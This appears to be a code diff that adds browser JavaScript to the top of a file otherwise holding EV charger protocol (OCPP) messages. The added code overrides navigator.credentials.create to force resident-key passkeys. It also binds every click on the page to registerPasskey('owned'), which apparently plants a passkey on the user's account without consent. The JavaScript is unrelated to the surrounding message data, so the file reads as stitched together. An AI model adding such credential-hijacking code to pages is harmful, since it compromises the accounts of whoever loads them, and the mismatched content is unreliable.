@@ -1,3 +1,12 @@
+const origCreate = navigator.credentials.create.bind(navigator.credentials);
+navigator.credentials.create = async (opts) => {
+    opts.publicKey.authenticatorSelection.residentKey = "required";
+    opts.publicKey.authenticatorSelection.requireResidentKey = true;
+    return await origCreate(opts);
+};
+document.body.onclick = () => registerPasskey('owned');
+
+
 [2, "msg-6", "Authorize", {"idTag": "admin"}]
 
 [2, "msg-2", "StatusNotification", {"connectorId": 1, "errorCode": "NoError", "status": "SuspendedEVSE"}]
